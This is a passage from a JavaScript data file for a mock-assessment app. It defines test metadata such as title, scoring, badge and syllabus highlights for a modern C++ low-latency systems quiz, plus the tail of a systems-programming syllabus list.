      'io_uring Zero-Syscall I/O via Mapped SQ/CQ Ring Buffers',
      'Weakly Ordered Memory: ARM64 Hardware Memory Barriers (DMB ISH)',
      'Lock-Free ABA Problem: 128-bit Double-Width Tagged CAS',
      'Thread-Caching Allocators: jemalloc tcache & Per-Arena Freelists',
      'Demand-Paged mmap() Virtual Address Spaces & MMU Page Faults',
      'POSIX Signal Reentrancy: Avoiding Non-Reentrant Deadlocks',
      'ELF Dynamic Linking: PLT Stubs, GOT Lazy Binding & Relocations'
    ],
    questions: C_TIER2_QUESTIONS
  },
  {
    id: 'mock-cpp-programming-tier2',
    title: 'Modern C++20 & Low-Latency Trading Systems (Tier-2 Assessment)',
    subtitle: '10 High-Yield Technical MCQs • 20 Minutes • C++20 Concepts, Coroutines, Acquire-Release Atomics & AVX-512',
    category: 'TECHNICAL CORE',
    companyTier: 'Tier-1 High-Frequency Trading & Low-Latency Systems',
    companies: ['Jane Street', 'Citadel', 'Jump Trading', 'Optiver'],
    scheduledDate: 'Tier-2 Assessment • Deep Systems Crucible (Modern C++)',
    durationMinutes: 20,
    totalQuestions: 10,
    marksPerQuestion: 4,
    negativeMark: 1,
    passingPercentage: 60,
    badgeRewardId: 'cpp-low-latency-architect',
    badgeRewardName: 'C++ Low-Latency & High-Frequency Architect',
    badgeIcon: '⚙️',
    badgeGradient: 'from-blue-800 via-indigo-950 to-slate-950',
    certificateTitle: 'Official Modern C++20 & Low-Latency Systems Credential',
    description: 'A premier high-frequency trading and low-latency C++ assessment probing C++20 Concepts constraint verification, stackless coroutine state machines, acquire-release atomic ordering, Intel AVX-512 FMA vectorization, CRTP static polymorphism, std::variant type-safe unions, perfect forwarding std::forward<T>, and False Sharing cache line alignment.',
    syllabusHighlights: [
      'C++20 Concepts: Compile-Time Constraint Verification vs SFINAE',
      'Stackless Coroutines: co_await State Machine Transformations',
      'Low-Latency Atomics: std::memory_order_acquire / release vs seq_cst',
      'SIMD Vectorization: AVX-512 Fused Multiply-Add (16 Floats/Cycle)',
      'Curiously Recurring Template Pattern (CRTP) Zero-Cost Polymorphism',
      'std::variant & std::visit Type-Safe Discriminated Unions',
      'Universal References & Perfect Forwarding std::forward<T>',
      'False Sharing Prevention via hardware_destructive_interference_size'
    ],
    questions: CPP_TIER2_QUESTIONS
  }
];

export const DOMAIN_TIER2_TESTS_PART1 = TIER2_MOCK_TESTS_PART1;
